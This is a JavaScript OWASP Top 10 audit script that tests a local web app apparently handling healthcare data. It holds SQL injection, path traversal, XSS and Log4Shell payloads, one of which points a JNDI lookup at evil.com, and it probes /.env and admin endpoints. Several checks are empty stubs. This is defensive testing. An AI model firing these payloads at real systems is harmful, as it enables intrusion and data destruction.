// tests/security/owasp-audit.js
const axios = require('axios')
const crypto = require('crypto')

class SecurityAudit {
  constructor(baseUrl = 'http://localhost:3000') {
    this.baseUrl = baseUrl
    this.vulnerabilities = []
  }

  async runFullAudit() {
    console.log('🛡️ Starting OWASP Top 10 Security Audit...')
    console.log('===============================================')

    await this.testInjectionVulnerabilities()
    await this.testBrokenAuthentication()
    await this.testSensitiveDataExposure()
    await this.testXXE()
    await this.testBrokenAccessControl()
    await this.testSecurityMisconfiguration()
    await this.testXSS()
    await this.testInsecureDeserialization()
    await this.testKnownVulnerabilities()
    await this.testInsufficientLogging()

    this.generateSecurityReport()
  }

  // OWASP A1: Injection
  async testInjectionVulnerabilities() {
    console.log('\n🔍 Testing for Injection Vulnerabilities...')
    
    const injectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "<script>alert('xss')</script>",
      "../../etc/passwd",
      "${jndi:ldap://evil.com/a}"
    ]

    for (const payload of injectionPayloads) {
      try {
        // Test SQL injection in login
        const response = await axios.post(`${this.baseUrl}/api/trpc/auth.login`, {
          email: payload,
          password: 'test'
        }, { timeout: 5000 })

        if (response.data && response.data.includes('error')) {
          console.log('✅ SQL Injection protection working')
        }
      } catch (error) {
        if (error.response?.status === 400) {
          console.log('✅ Input validation blocking injection attempts')
        }
      }
    }
  }

  // OWASP A2: Broken Authentication
  async testBrokenAuthentication() {
    console.log('\n🔐 Testing Authentication Security...')

    // Test weak password policy
    const weakPasswords = ['123456', 'password', 'admin', '']
    
    for (const password of weakPasswords) {
      try {
        const response = await axios.post(`${this.baseUrl}/api/trpc/auth.register`, {
          email: 'test@test.com',
          password: password,
          role: 'client'
        })
        
        if (response.status === 200) {
          this.vulnerabilities.push({
            type: 'Weak Password Policy',
            severity: 'HIGH',
            description: `Weak password "${password}" was accepted`
          })
        }
      } catch (error) {
        if (error.response?.status === 400) {
          console.log('✅ Password policy enforced')
        }
      }
    }

    // Test session management
    await this.testSessionSecurity()
  }

  async testSessionSecurity() {
    try {
      // Test session fixation
      const response = await axios.get(`${this.baseUrl}/api/trpc/auth.me`, {
        headers: { 'Authorization': 'Bearer invalid-token' }
      })
      
      if (response.status === 200) {
        this.vulnerabilities.push({
          type: 'Session Fixation',
          severity: 'HIGH',
          description: 'Invalid session tokens are being accepted'
        })
      }
    } catch (error) {
      if (error.response?.status === 401) {
        console.log('✅ Session validation working')
      }
    }
  }

  // OWASP A3: Sensitive Data Exposure
  async testSensitiveDataExposure() {
    console.log('\n🔒 Testing for Sensitive Data Exposure...')

    // Check for exposed endpoints
    const sensitiveEndpoints = [
      '/api/trpc',
      '/.env',
      '/config',
      '/admin',
      '/debug'
    ]

    for (const endpoint of sensitiveEndpoints) {
      try {
        const response = await axios.get(`${this.baseUrl}${endpoint}`)
        
        if (response.data && typeof response.data === 'object') {
          // Check for exposed secrets
          const dataString = JSON.stringify(response.data)
          const sensitivePatterns = [
            /password/i,
            /secret/i,
            /key/i,
            /token/i,
            /ssn/i,
            /social.?security/i
          ]

          for (const pattern of sensitivePatterns) {
            if (pattern.test(dataString)) {
              this.vulnerabilities.push({
                type: 'Sensitive Data Exposure',
                severity: 'HIGH',
                description: `Potential sensitive data exposed in ${endpoint}`
              })
            }
          }
        }
      } catch (error) {
        // Expected for protected endpoints
      }
    }
  }

  // OWASP A5: Broken Access Control
  async testBrokenAccessControl() {
    console.log('\n👮 Testing Access Control...')

    // Test horizontal privilege escalation
    try {
      const response = await axios.get(`${this.baseUrl}/api/trpc/clients.getProfile`, {
        params: { id: 'other-user-id' },
        headers: { 'Authorization': 'Bearer test-token' }
      })

      if (response.status === 200) {
        this.vulnerabilities.push({
          type: 'Broken Access Control',
          severity: 'HIGH',
          description: 'User can access other users\' data'
        })
      }
    } catch (error) {
      if (error.response?.status === 403) {
        console.log('✅ Access control working')
      }
    }

    // Test admin endpoint access
    try {
      const response = await axios.get(`${this.baseUrl}/api/trpc/admin.dashboard`, {
        headers: { 'Authorization': 'Bearer non-admin-token' }
      })

      if (response.status === 200) {
        this.vulnerabilities.push({
          type: 'Privilege Escalation',
          severity: 'CRITICAL',
          description: 'Non-admin user can access admin endpoints'
        })
      }
    } catch (error) {
      if (error.response?.status === 403) {
        console.log('✅ Admin access control working')
      }
    }
  }

  // OWASP A6: Security Misconfiguration
  async testSecurityMisconfiguration() {
    console.log('\n⚙️ Testing Security Configuration...')

    try {
      const response = await axios.get(`${this.baseUrl}`)
      
      // Check security headers
      const headers = response.headers
      const requiredHeaders = [
        'x-frame-options',
        'x-content-type-options',
        'strict-transport-security',
        'x-xss-protection'
      ]

      for (const header of requiredHeaders) {
        if (!headers[header]) {
          this.vulnerabilities.push({
            type: 'Missing Security Header',
            severity: 'MEDIUM',
            description: `Missing ${header} header`
          })
        } else {
          console.log(`✅ ${header} header present`)
        }
      }

      // Check for development mode indicators
      if (headers['x-powered-by']) {
        this.vulnerabilities.push({
          type: 'Information Disclosure',
          severity: 'LOW',
          description: 'X-Powered-By header reveals server information'
        })
      }

    } catch (error) {
      console.error('Error testing security configuration:', error.message)
    }
  }

  // OWASP A7: Cross-Site Scripting (XSS)
  async testXSS() {
    console.log('\n🚨 Testing for XSS Vulnerabilities...')

    const xssPayloads = [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src=x onerror=alert("xss")>',
      '<svg onload=alert("xss")>'
    ]

    for (const payload of xssPayloads) {
      try {
        // Test XSS in form inputs
        const response = await axios.post(`${this.baseUrl}/api/trpc/messages.send`, {
          content: payload,
          recipientId: 'test-id'
        }, {
          headers: { 'Authorization': 'Bearer test-token' }
        })

        if (response.data && response.data.includes(payload)) {
          this.vulnerabilities.push({
            type: 'Stored XSS',
            severity: 'HIGH',
            description: 'XSS payload was stored without sanitization'
          })
        }
      } catch (error) {
        if (error.response?.status === 400) {
          console.log('✅ Input sanitization working')
        }
      }
    }
  }

  // Additional security tests...
  async testXXE() {
    console.log('\n📄 Testing for XXE Vulnerabilities...')
    // XXE testing logic
  }

  async testInsecureDeserialization() {
    console.log('\n🔄 Testing for Insecure Deserialization...')
    // Deserialization testing logic
  }

  async testKnownVulnerabilities() {
    console.log('\n📋 Checking for Known Vulnerabilities...')
    // Known vulnerability testing logic
  }

  async testInsufficientLogging() {
    console.log('\n📝 Testing Logging and Monitoring...')
    // Logging testing logic
  }

  generateSecurityReport() {
    console.log('\n📊 SECURITY AUDIT REPORT')
    console.log('========================')
    
    if (this.vulnerabilities.length === 0) {
      console.log('✅ No vulnerabilities found!')
      return
    }

    const severityCounts = {
      CRITICAL: this.vulnerabilities.filter(v => v.severity === 'CRITICAL').length,
      HIGH: this.vulnerabilities.filter(v => v.severity === 'HIGH').length,
      MEDIUM: this.vulnerabilities.filter(v => v.severity === 'MEDIUM').length,
      LOW: this.vulnerabilities.filter(v => v.severity === 'LOW').length
    }

    console.log(`🔴 Critical: ${severityCounts.CRITICAL}`)
    console.log(`🟠 High: ${severityCounts.HIGH}`)
    console.log(`🟡 Medium: ${severityCounts.MEDIUM}`)
    console.log(`🟢 Low: ${severityCounts.LOW}`)

    console.log('\nDetailed Vulnerabilities:')
    this.vulnerabilities.forEach((vuln, index) => {
      console.log(`${index + 1}. [${vuln.severity}] ${vuln.type}`)
      console.log(`   ${vuln.description}`)
    })
  }
}

class HIPAAComplianceAudit extends SecurityAudit {
  async runHIPAACompliance() {
    console.log('\n🏥 Running HIPAA Compliance Audit...')
    await this.runFullAudit()
    await this.checkAccessControls()
    await this.checkAuditLogging()
    await this.checkDataEncryption()
  }

  async checkAccessControls() {
    // Add HIPAA-specific access control checks
  }

  async checkAuditLogging() {
    // Add HIPAA-specific audit logging checks
  }

  async checkDataEncryption() {
    // Add HIPAA-specific data encryption checks
  }
}

class PenetrationTest extends SecurityAudit {
  // Add penetration testing specific methods later
}

module.exports = {
  SecurityAudit,
  HIPAAComplianceAudit,
  PenetrationTest
}